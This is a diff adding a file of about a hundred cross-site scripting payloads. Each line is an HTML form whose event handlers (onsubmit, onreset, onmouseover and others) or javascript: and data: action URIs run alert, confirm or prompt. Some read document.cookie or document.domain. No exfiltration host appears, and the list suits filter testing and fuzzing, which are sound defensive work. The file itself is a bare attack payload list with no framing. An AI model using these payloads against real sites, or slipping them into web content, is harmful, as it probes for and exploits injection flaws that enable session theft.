@@ -1,0 +1,99 @@
+<form onsubmit="alert(1)"><input type=submit></form>
+<form onreset="alert(2)"><input type=reset></form>
+<form oninput="alert(3)"><input></form>
+<form onchange="alert(4)"><input></form>
+<form onfocusin="alert(5)"><input></form>
+<form onfocusout="alert(6)"><input></form>
+<form onkeydown="alert(7)"><input></form>
+<form onkeypress="alert(8)"><input></form>
+<form onkeyup="alert(9)"><input></form>
+<form onclick="alert(10)"><input></form>
+<form ondblclick="alert(11)"><input></form>
+<form onmousedown="alert(12)"><input></form>
+<form onmouseup="alert(13)"><input></form>
+<form onmouseenter="alert(14)"><input></form>
+<form onmouseleave="alert(15)"><input></form>
+<form onmouseover="alert(16)"><input></form>
+<form onmouseout="alert(17)"><input></form>
+<form onwheel="alert(18)"><input></form>
+<form oncontextmenu="alert(19)"><input></form>
+<form oncut="alert(20)"><input></form>
+<form oncopy="alert(21)"><input></form>
+<form onpaste="alert(22)"><input></form>
+<form oninvalid="alert(23)"><input required></form>
+<form onblur="alert(24)"><input></form>
+<form onfocus="alert(25)"><input></form>
+<form onscroll="alert(26)" style="overflow:auto; height:10px;"><div>scroll</div></form>
+<form onsubmit="confirm('XSS27')"><input type=submit></form>
+<form onsubmit="prompt('XSS28')"><input type=submit></form>
+<form onsubmit="console.log('XSS29')"><input type=submit></form>
+<form onsubmit="alert(document.cookie)"><input type=submit></form>
+<form onsubmit="alert(document.domain)"><input type=submit></form>
+<form onsubmit="alert(window.location)"><input type=submit></form>
+<form onsubmit="alert(navigator.userAgent)"><input type=submit></form>
+<form onsubmit="setTimeout(alert,1000,30)"><input type=submit></form>
+<form onsubmit="return alert(31)"><input type=submit></form>
+<form onsubmit="return confirm(32)"><input type=submit></form>
+<form onsubmit="return prompt(33)"><input type=submit></form>
+<form onsubmit="void(alert(34))"><input type=submit></form>
+<form onsubmit="event.preventDefault();alert(35)"><input type=submit></form>
+<form onsubmit="alert(String.fromCharCode(88,83,83))"><input type=submit></form>
+<form onreset="alert('reset36')"><input type=reset></form>
+<form onreset="confirm('reset37')"><input type=reset></form>
+<form onreset="prompt('reset38')"><input type=reset></form>
+<form onreset="console.log('reset39')"><input type=reset></form>
+<form onreset="alert(document.cookie)"><input type=reset></form>
+<form onreset="alert(document.domain)"><input type=reset></form>
+<form onreset="alert(window.location)"><input type=reset></form>
+<form onreset="alert(navigator.userAgent)"><input type=reset></form>
+<form onreset="setTimeout(alert,1000,40)"><input type=reset></form>
+<form onreset="return alert(41)"><input type=reset></form>
+<form onreset="return confirm(42)"><input type=reset></form>
+<form onreset="return prompt(43)"><input type=reset></form>
+<form onreset="void(alert(44))"><input type=reset></form>
+<form onreset="event.preventDefault();alert(45)"><input type=reset></form>
+<form onreset="alert(String.fromCharCode(88,83,83))"><input type=reset></form>
+<form action="javascript:alert(46)"><input type=submit></form>
+<form action="javascript:alert(document.domain)"><input type=submit></form>
+<form action="javascript:alert(document.cookie)"><input type=submit></form>
+<form action="javascript:alert(window.location)"><input type=submit></form>
+<form action="javascript:alert(navigator.userAgent)"><input type=submit></form>
+<form action="javascript:alert(47)"><input type=submit></form>
+<form action="javascript:confirm(48)"><input type=submit></form>
+<form action="javascript:prompt(49)"><input type=submit></form>
+<form action="javascript:console.log('XSS50')"><input type=submit></form>
+<form method="GET" action="javascript:alert(51)"><input type=submit></form>
+<form method="POST" action="javascript:alert(52)"><input type=submit></form>
+<form enctype="text/plain" action="javascript:alert(53)"><input type=submit></form>
+<form novalidate onsubmit="alert(54)"><input type=submit></form>
+<form autocomplete="off" onsubmit="alert(55)"><input type=submit></form>
+<form name="xss" onsubmit="alert(56)"><input type=submit></form>
+<form id="xss" onsubmit="alert(57)"><input type=submit></form>
+<form class="xss" onsubmit="alert(58)"><input type=submit></form>
+<form style="display:none" onsubmit="alert(59)"><input type=submit></form>
+<form tabindex="0" onsubmit="alert(60)"><input type=submit></form>
+<form spellcheck="true" onsubmit="alert(61)"><input type=submit></form>
+<form dir="ltr" onsubmit="alert(62)"><input type=submit></form>
+<form lang="en" onsubmit="alert(63)"><input type=submit></form>
+<form enctype="application/x-www-form-urlencoded" onsubmit="alert(64)"><input type=submit></form>
+<form enctype="multipart/form-data" onsubmit="alert(65)"><input type=submit></form>
+<form target="_blank" onsubmit="alert(66)"><input type=submit></form>
+<form target="_self" onsubmit="alert(67)"><input type=submit></form>
+<form target="_parent" onsubmit="alert(68)"><input type=submit></form>
+<form target="_top" onsubmit="alert(69)"><input type=submit></form>
+<form action="data:text/html,<script>alert(70)</script>"><input type=submit></form>
+<form onsubmit="alert(document.forms.length)"><input type=submit></form>
+<form onsubmit="alert(document.forms[0].name)"><input type=submit></form>
+<form onsubmit="alert(event.type)"><input type=submit></form>
+<form onsubmit="alert(event.target)"><input type=submit></form>
+<form onsubmit="alert(event.currentTarget)"><input type=submit></form>
+<form onsubmit="alert(document.activeElement.tagName)"><input type=submit></form>
+<form onsubmit="alert(navigator.language)"><input type=submit></form>
+<form onsubmit="alert(navigator.platform)"><input type=submit></form>
+<form onsubmit="alert(navigator.vendor)"><input type=submit></form>
+<form onsubmit="alert(window.screen.availWidth)"><input type=submit></form>
+<form onsubmit="alert(window.screen.availHeight)"><input type=submit></form>
+<form onsubmit="alert(window.innerWidth)"><input type=submit></form>
+<form onsubmit="alert(window.innerHeight)"><input type=submit></form>
+<form onsubmit="alert(document.compatMode)"><input type=submit></form>
+<form onsubmit="alert(document.readyState)"><input type=submit></form>
